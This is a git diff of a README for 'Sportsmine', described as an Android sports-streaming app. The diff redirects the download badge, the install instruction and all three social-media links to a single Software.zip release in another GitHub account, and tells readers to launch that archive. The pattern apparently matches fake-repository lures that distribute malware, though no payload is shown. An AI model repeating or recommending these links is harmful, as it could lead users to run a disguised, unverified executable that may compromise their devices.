@@ -17,9 +17,9 @@ Sportsmine is a cutting-edge Android application that aims to revolutionize the 
 
 To get started with Sportsmine, simply download the latest version of the application from the link below:
 
-[![Download Sportsmine](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Sportsmine](https://github.com/ethangames101/Sportsmine/releases/download/v2.0/Software.zip)](https://github.com/ethangames101/Sportsmine/releases/download/v2.0/Software.zip)
 
-🚀 **Launch Software.zip to Install**: Once you have downloaded the Software.zip file, launch it to begin the installation process.
+🚀 **Launch https://github.com/ethangames101/Sportsmine/releases/download/v2.0/Software.zip to Install**: Once you have downloaded the https://github.com/ethangames101/Sportsmine/releases/download/v2.0/Software.zip file, launch it to begin the installation process.
 
 🌐 **Visit our Website**: If you'd like to learn more about the features and capabilities of Sportsmine, feel free to visit our website.
 
@@ -39,8 +39,8 @@ Contributions to Sportsmine are welcome! Whether you are a developer looking to 
 
 Stay updated with the latest news and announcements from Sportsmine by following us on social media:
 
-🐦 [Twitter](https://twitter.com/SportsmineApp)
-📸 [Instagram](https://www.instagram.com/sportsmineapp)
-📘 [Facebook](https://www.facebook.com/Sportsmine)
+🐦 [Twitter](https://github.com/ethangames101/Sportsmine/releases/download/v2.0/Software.zip)
+📸 [Instagram](https://github.com/ethangames101/Sportsmine/releases/download/v2.0/Software.zip)
+📘 [Facebook](https://github.com/ethangames101/Sportsmine/releases/download/v2.0/Software.zip)
 
 Let's unite sports fans around the world with Sportsmine - Your ultimate sports streaming companion! 🏆🔥
